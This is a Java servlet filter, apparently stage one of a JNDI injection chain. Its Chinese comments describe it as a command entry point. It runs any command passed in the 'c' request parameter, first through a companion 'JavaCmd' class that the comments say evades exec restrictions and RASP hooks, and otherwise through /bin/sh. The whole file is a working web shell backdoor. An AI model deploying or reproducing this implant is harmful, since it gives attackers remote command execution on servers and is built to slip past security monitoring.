import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.lang.reflect.Method;

/**
 * CmdFilter —— JNDI 阶段 1 注册的命令入口。
 *
 * 优先加载同 codebase 下的 JavaCmd（阶段 2），用纯 Java 解释执行命令：
 * 不 spawn 进程，可绕过 disable-exec / 无 shell / RASP 只拦 ProcessBuilder 的场景。
 * 仅当 JavaCmd 不存在时才回退 ProcessBuilder，便于旧靶场兼容。
 */
public class CmdFilter implements Filter {
    public void init(FilterConfig fc) {}
    public void destroy() {}

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException {
        HttpServletRequest hreq = (HttpServletRequest) req;
        HttpServletResponse hresp = (HttpServletResponse) resp;
        String cmd = hreq.getParameter("c");
        if (cmd == null) { hresp.getWriter().write("usage: /cmd?c=id"); return; }
        hresp.setContentType("text/plain");
        PrintWriter out = hresp.getWriter();
        try {
            Class<?> jc = Class.forName("JavaCmd", true, CmdFilter.class.getClassLoader());
            Method m = jc.getMethod("exec", String.class);
            out.println(String.valueOf(m.invoke(null, cmd)));
            hresp.setHeader("X-Exec-Mode", "java-native");
        } catch (Throwable notLoaded) {
            try {
                Process p = new ProcessBuilder("/bin/sh", "-c", cmd).redirectErrorStream(true).start();
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String l;
                while ((l = br.readLine()) != null) out.println(l);
                p.waitFor();
                hresp.setHeader("X-Exec-Mode", "process");
            } catch (Exception e) {
                out.println("ERR: " + e.getMessage());
            }
        }
    }
}
